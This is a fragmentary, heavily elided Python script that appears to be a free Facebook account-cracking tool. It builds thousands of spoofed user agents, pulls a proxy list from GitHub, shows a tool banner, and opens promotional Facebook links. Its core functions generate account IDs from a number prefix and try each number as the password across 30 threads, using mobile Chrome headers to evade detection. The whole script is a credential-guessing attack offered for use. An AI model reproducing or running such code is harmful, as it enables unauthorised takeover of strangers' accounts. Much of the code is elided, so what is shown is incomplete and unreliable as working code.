...
for xd in range(5000):
    ...
    ugen.append(uaku2)
try:
    prox= requests.get('https://raw.githubusercontent.com/Mradi007/Server/main/proxy.txt').text
...
logo ="""  \033[1;92m
  ...
  \033[1;37m             ____  ____  ____  _____ _____ ____  ____  ____  ____   
...
\/   \/\\____/\/   \___\____/\___/\___/\/\\
  ...
  \x1b[1;92m  
\x1b[1;97m---------------------------------------------------
\x1b[1;97m     ONWER      :   \033[1;32mPROFESSER MATRIC FAIL
\x1b[1;97m     GITHUB     :   \033[1;32mPRIVATE
\x1b[1;97m     TOOL       :   \x1b[1;92mFREE
\x1b[1;97m     VERSION    :   \x1b[1;92m1.0
\x1b[1;97m---------------------------------------------------"""
clear()
#---------------------[LOOP MENU]---------------------#
loop = 0
...
def main():
    ...
    if adi in ["1","01"]:
       Adi()
        ...
        os.system("xdg-open https://www.facebook.com/vanash.sayani.96")
        main()
        os.system('xdg-open https://facebook.com/groups/496250115025499/ ')
        main()
    elif adi in ["0","00"]:
       exit()
    else:
...
def mradi1():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=30) as mradi:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        linex()
        ...
        for love in user:
            uid = code+love
            pwx = [love,]
            mradi.submit(mbasicq,uid,pwx,tl)
    print('')
    linex()
...
def mbasicq(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="113.0.5630.207", "Google Chrome";v="113.0.5630.207"',
            'sec-ch-ua-mobile': '?1',
            ...
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5630.207 Mobile Safari/537.36',}
